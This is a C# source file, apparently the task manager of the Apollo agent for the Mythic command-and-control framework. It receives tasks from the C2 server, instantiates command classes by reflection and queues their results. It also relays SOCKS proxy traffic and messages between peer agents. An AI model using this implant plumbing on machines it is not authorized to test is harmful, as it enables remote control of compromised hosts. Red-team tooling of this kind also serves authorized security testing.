using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Collections.Concurrent;
using ApolloInterop.Interfaces;
using ApolloInterop.Types.Delegates;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Classes;
using System.Threading;
using ThreadingTask = System.Threading.Tasks.Task;
using AT = Tasks;
using System.Reflection;

namespace Apollo.Management.Tasks
{
    internal struct TaskInformation {
        Task Task;
        CancellationToken Token;
    }
    public class TaskManager : ITaskManager
    {
        protected IAgent _agent;


        private ConcurrentQueue<TaskResponse> TaskResponseQueue = new ConcurrentQueue<TaskResponse>();

        private ConcurrentQueue<DelegateMessage> DelegateMessages = new ConcurrentQueue<DelegateMessage>();

        private Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>> SocksDatagramQueue = new Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>>()
        {
            { MessageDirection.ToMythic, new ConcurrentQueue<SocksDatagram>() },
            { MessageDirection.FromMythic, new ConcurrentQueue<SocksDatagram>() }
        };

        private ConcurrentDictionary<string, Tasking> _runningTasks = new ConcurrentDictionary<string, Tasking>();

        private ConcurrentQueue<Task> TaskQueue = new ConcurrentQueue<Task>();
        private ConcurrentQueue<TaskStatus> TaskStatusQueue = new ConcurrentQueue<TaskStatus>();
        private Action _taskConsumerAction;
        private ThreadingTask _mainworker;
        private Assembly _tasksAsm = null;
        public TaskManager(IAgent agent)
        {
            _agent = agent;
            AT.Initializer.New();
            foreach(var asm in Assembly.GetExecutingAssembly().GetReferencedAssemblies())
            {
                if (asm.Name == "Tasks")
                {
                    _tasksAsm = Assembly.Load(asm);
                    break;
                }
            }
            if (_tasksAsm == null)
            {
                throw new Exception("Could not find loaded tasks assembly.");
            }
            _taskConsumerAction = () =>
            {
                while(_agent.IsAlive())
                {
                    if (TaskQueue.TryDequeue(out Task result))
                    {
                        Type taskType = _tasksAsm.GetType($"Tasks.{result.Command}");
                        if (taskType == null)
                        {
                            AddTaskResponseToQueue(new TaskResponse()
                            {
                                UserOutput = $"Task '{result.Command}' not loaded.",
                                TaskID = result.ID,
                                Completed = true,
                                Status = "error"
                            });
                        } else
                        {
                            Tasking t = (Tasking)Activator.CreateInstance(taskType, new object[] { _agent, result });
                            var taskObj = t.CreateTasking();
                            // When the task finishes, we remove it from the queue.
                            taskObj.ContinueWith((_) =>
                            {
                                _runningTasks.TryRemove(t.ID(), out Tasking _);
                            });
                            // Unhandled exception occurred in task, report it.
                            taskObj.ContinueWith((_) =>
                            {
                                OnTaskErrorOrCancel(t, taskObj);
                            }, System.Threading.Tasks.TaskContinuationOptions.OnlyOnFaulted);
                            // If it got cancelled and threw an exception of that type,
                            // report it.
                            taskObj.ContinueWith((_) =>
                            {
                                OnTaskErrorOrCancel(t, taskObj);
                            }, System.Threading.Tasks.TaskContinuationOptions.OnlyOnCanceled);
                            _runningTasks.TryAdd(t.ID(), t);
                            taskObj.Start();
                        }

                    }
                }
            };
            _mainworker = new ThreadingTask(_taskConsumerAction);
            _mainworker.Start();
        }

        private void OnTaskErrorOrCancel(Tasking t, System.Threading.Tasks.Task taskObj)
        {
            string aggregateError = "";
            if (taskObj.Exception != null)
            {
                foreach (Exception e in taskObj.Exception.InnerExceptions)
                {
                    aggregateError += $"Unhandled exception: {e}\n\n";
                }
            } else if (taskObj.IsCanceled)
            {
                aggregateError = "Task cancelled.";
            }
            else
            {
                aggregateError = "Unhandled and unknown error occured.";
            }
            var msg = t.CreateTaskResponse(aggregateError, true, "error");
            AddTaskResponseToQueue(msg);
        }

        public void AddTaskResponseToQueue(TaskResponse message)
        {
            TaskResponseQueue.Enqueue(message);
        }

        public void AddDelegateMessageToQueue(DelegateMessage delegateMessage)
        {
            DelegateMessages.Enqueue(delegateMessage);
        }

        public void AddSocksDatagramToQueue(MessageDirection direction, SocksDatagram dg)
        {
            SocksDatagramQueue[direction].Enqueue(dg);
        }


        public bool ProcessMessageResponse(MessageResponse resp)
        {
            if (resp.SocksDatagrams != null)
            {
                System.Threading.Tasks.Parallel.ForEach(resp.SocksDatagrams, (SocksDatagram dg) =>
                {
                    _agent.GetSocksManager().Route(dg);
                });
            }

            if (resp.Tasks != null && resp.Tasks.Length > 0)
            {
                foreach(Task t in resp.Tasks)
                {
                    TaskQueue.Enqueue(t);
                }
            }
            if (resp.Responses != null && resp.Responses.Length > 0)
            {
                foreach(TaskStatus t in resp.Responses)
                {
                    TaskStatusQueue.Enqueue(t);
                }
            }
            if (resp.Delegates != null && resp.Delegates.Length > 0)
            {
                foreach(DelegateMessage d in resp.Delegates)
                {
                    _agent.GetPeerManager().Route(d);
                }
            }

            return true;
        }

        public bool CreateTaskingMessage(OnResponse<TaskingMessage> onResponse)
        {
            // We should pop messages from the task manager and stuff them into
            // this message here.

            List<TaskResponse> responses = new List<TaskResponse>();
            List<DelegateMessage> delegates = new List<DelegateMessage>();
            List<SocksDatagram> dgs = new List<SocksDatagram>();

            while(TaskResponseQueue.TryDequeue(out TaskResponse res))
            {
                responses.Add(res);
            }

            while(DelegateMessages.TryDequeue(out var res))
            {
                delegates.Add(res);
            }

            while(SocksDatagramQueue[MessageDirection.ToMythic].TryDequeue(out var dg))
            {
                dgs.Add(dg);
            }

            TaskingMessage msg = new TaskingMessage()
            {
                Action = MessageAction.GetTasking.ToString(),
                TaskingSize = -1,
                Delegates = delegates.ToArray(),
                Responses = responses.ToArray(),
                Socks = dgs.ToArray()
            };
            return onResponse(msg);
        }

        public bool CancelTask(string taskId)
        {
            if (_runningTasks.TryGetValue(taskId, out Tasking t))
            {
                try
                {
                    t.Kill();
                    return true;
                } catch
                {
                    return false;
                }
            } else
            {
                return false;
            }
        }
    }
}
